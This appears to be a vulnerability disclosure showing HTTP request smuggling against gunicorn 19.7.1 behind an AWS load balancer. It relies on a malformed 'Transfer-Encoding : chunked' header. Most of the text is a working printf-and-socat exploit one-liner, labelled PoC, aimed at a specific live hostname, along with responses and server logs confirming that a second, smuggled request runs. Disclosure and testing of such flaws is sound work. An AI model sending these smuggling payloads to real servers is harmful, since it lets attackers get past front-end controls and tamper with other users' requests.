```yaml
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 84\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
HTTP/1.1 200 OK
Date: Sun, 21 Jul 2024 15:47:55 GMT
Content-Type: application/json
Content-Length: 338
Connection: close
Server: gunicorn/19.7.1

{
  "body": "",
  "headers": {
    "Content-Length": "84",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-669d2dab-07b42efe703101952c2f6e9c",
    "X-Forwarded-For": "27.60.175.227",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```
this made 2 request in the server:
```
[2024-07-21 15:47:55 +0000] [9] [DEBUG] POST /
[2024-07-21 15:47:55 +0000] [9] [DEBUG] POST /
```



# PoC
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nXXX / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```
```yaml
HTTP/1.1 200 OK
Date: Sun, 21 Jul 2024 15:51:36 GMT
Content-Type: application/json
Content-Length: 338
Connection: close
Server: gunicorn/19.7.1

{
  "body": "",
  "headers": {
    "Content-Length": "83",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-669d2e88-05e65f9c6c82918143f390bb",
    "X-Forwarded-For": "27.60.175.227",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```

in the server:
```
[2024-07-21 15:53:17 +0000] [9] [DEBUG] POST /
[2024-07-21 15:53:17 +0000] [9] [DEBUG] XXX /
[2024-07-21 15:53:17 +0000] [9] [DEBUG] Closing connection.
```
